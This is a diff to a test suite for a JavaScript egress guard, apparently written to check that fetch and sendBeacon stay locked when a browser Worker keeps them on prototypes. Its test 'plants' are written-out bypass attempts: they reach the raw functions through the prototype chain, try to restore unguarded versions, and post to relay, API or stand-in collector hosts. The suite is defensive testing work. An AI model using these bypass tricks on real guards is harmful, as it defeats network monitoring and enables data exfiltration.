@@ -143,6 +143,17 @@ globalThis.XMLHttpRequest = class { open(_m, u) { this.u = u; } send() { record(
 globalThis.WebSocket = class { constructor(u) { record('websocket', u); } };
 globalThis.EventSource = class { constructor(u) { record('eventsource', u); } };
 Object.defineProperty(globalThis.navigator, 'sendBeacon', { configurable: true, writable: true, value: (u) => { record('beacon', u); return true; } });
+// PROTO=1: the stubs live where a browser Worker keeps them, on a prototype of the scope (fetch on
+// WorkerGlobalScope.prototype, sendBeacon on Navigator.prototype), with no own property left.
+if (process.env.PROTO === '1') {
+  const scopeProto = Object.create(Object.getPrototypeOf(globalThis));
+  Object.defineProperty(scopeProto, 'fetch', { configurable: true, writable: true, value: globalThis.fetch });
+  delete globalThis.fetch;
+  Object.setPrototypeOf(globalThis, scopeProto);
+  Object.defineProperty(Object.getPrototypeOf(globalThis.navigator), 'sendBeacon', { configurable: true, writable: true, value: globalThis.navigator.sendBeacon });
+  delete globalThis.navigator.sendBeacon;
+  if (Object.hasOwn(globalThis, 'fetch') || Object.hasOwn(globalThis.navigator, 'sendBeacon')) throw new Error('PROTO: an own property is left');
+}
 let guard = 'missing';
 try {
   const { installEgressGuard } = await import(process.env.EGRESS_MODULE);
@@ -245,7 +256,25 @@ export async function go() { try { await fetch(RELAY_URL, ${POST}); } catch (e) 
 };
 Object.assign(PLANTS, APP_RELAY_PLANTS);
 
-function run(names: string[], opts: { client?: boolean; allowed?: string[]; metered?: string[]; endpoint?: string } = {}) {
+// The security review's S1 (review-security-P16h-web-1): fetch and sendBeacon called through the
+// prototype that holds the raw function, as a browser Worker and page expose them. The last two
+// first try to put a raw function back, which the lock refuses; they run last, so a replacement
+// that got through cannot reach the other plants.
+const PROTO_OWNER = `const owner = (o, k) => { for (let p = Object.getPrototypeOf(o); p !== null; p = Object.getPrototypeOf(p)) if (Object.hasOwn(p, k)) return p; throw new Error('no prototype holds ' + k); };
+const restore = (o, k, v) => { try { owner(o, k)[k] = v; } catch {} };`;
+const PROTO_PLANTS: Record<string, string> = {
+  'p-proto-fetch-relay': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, '${RELAY_URL}', ${POST});`,
+  'p-proto-fetch-api': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, 'https://${HOST}/v1/messages', ${POST});`,
+  'p-proto-beacon-relay': `${PROTO_OWNER}\nexport const go = () => owner(navigator, 'sendBeacon').sendBeacon.call(navigator, '${RELAY_URL}', '{}');`,
+  'p-proto-beacon-api': `${PROTO_OWNER}\nexport const go = () => owner(navigator, 'sendBeacon').sendBeacon.call(navigator, 'https://${HOST}/v1/messages', '{}');`,
+  'p-proto-foreign-fetch': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, 'https://example.org/collect', ${POST});`,
+  'p-proto-self-fetch': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, '${SELF}/assets/x.json');`,
+  'p-proto-fetch-restore': `${PROTO_OWNER}\nexport const go = () => { restore(globalThis, 'fetch', () => 'raw'); return owner(globalThis, 'fetch').fetch.call(globalThis, '${RELAY_URL}', ${POST}); };`,
+  'p-proto-beacon-restore': `${PROTO_OWNER}\nexport const go = () => { restore(navigator, 'sendBeacon', () => true); return owner(navigator, 'sendBeacon').sendBeacon.call(navigator, '${RELAY_URL}', '{}'); };`,
+};
+Object.assign(PLANTS, PROTO_PLANTS);
+
+function run(names: string[], opts: { client?: boolean; allowed?: string[]; metered?: string[]; endpoint?: string; proto?: boolean } = {}) {
   const dir = tempDir('egress');
   write(dir, 'package.json', '{"type":"module"}');
   write(dir, 'host.json', JSON.stringify({ url: `https://${HOST}/v1/messages` }));
@@ -259,6 +288,7 @@ function run(names: string[], opts: { client?: boolean; allowed?: string[]; mete
     ...(opts.allowed ? { ALLOWED: opts.allowed.join(',') } : {}),
     ...(opts.metered ? { METERED: opts.metered.join(',') } : {}),
     ...(opts.endpoint ? { ENDPOINT: opts.endpoint } : {}),
+    ...(opts.proto ? { PROTO: '1' } : {}),
   };
   const r = spawnSync(process.execPath, ['runner.mjs'], { cwd: dir, env, encoding: 'utf8' });
   if (r.status !== 0) throw new Error(`runner exited ${r.status}: ${r.stderr}`);
@@ -270,7 +300,7 @@ function run(names: string[], opts: { client?: boolean; allowed?: string[]; mete
 }
 
 describe('the egress guard refuses every send to the API host that MessagesClient did not make', () => {
-  const names = Object.keys(PLANTS).filter((n) => !(n in ORIGIN_PLANTS) && !(n in RELAY_PLANTS) && !(n in APP_RELAY_PLANTS));
+  const names = Object.keys(PLANTS).filter((n) => !(n in ORIGIN_PLANTS) && !(n in RELAY_PLANTS) && !(n in APP_RELAY_PLANTS) && !(n in PROTO_PLANTS));
   const out = run(names, { client: true });
 
   it('installs', () => {
@@ -424,6 +454,29 @@ describe('the app relay (APP_CSP, RELAY_URL) is guarded as the app installs the 
 
   it('h-relay-url: the refusal is an EgressRefusal that names the relay origin', () => {
     expect(out.plants['h-relay-url']?.error).toMatch(new RegExp(`^EgressRefusal: egress guard: fetch to ${RELAY_ORIGIN} refused`));
+  });
+});
+
+describe('with fetch and sendBeacon on prototypes (a browser Worker and page), the guard locks them there too', () => {
+  const names = Object.keys(PROTO_PLANTS);
+  const out = run(names, { client: true, allowed: [SELF, RELAY], metered: [RELAY], endpoint: RELAY_URL, proto: true });
+
+  it('installs', () => {
+    expect(out.guard).toBe('installed');
+  });
+
+  it.each(names.filter((n) => n !== 'p-proto-self-fetch'))('%s: refused with EgressRefusal, 0 sends', (name) => {
+    const p = out.plants[name];
+    expect(p?.sends).toEqual([]);
+    expect(p?.error).toMatch(/egress guard/);
+  });
+
+  it('p-proto-self-fetch: the prototype fetch is the guarded one, so its own origin still answers with redirect: error', () => {
+    expect(out.plants['p-proto-self-fetch']).toEqual({ sends: [{ api: 'fetch', host: 'app.test', redirect: 'error' }], error: null });
+  });
+
+  it('MessagesClient\'s own call to the relay passes, once', () => {
+    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: 'relay.test' }] });
   });
 });
 
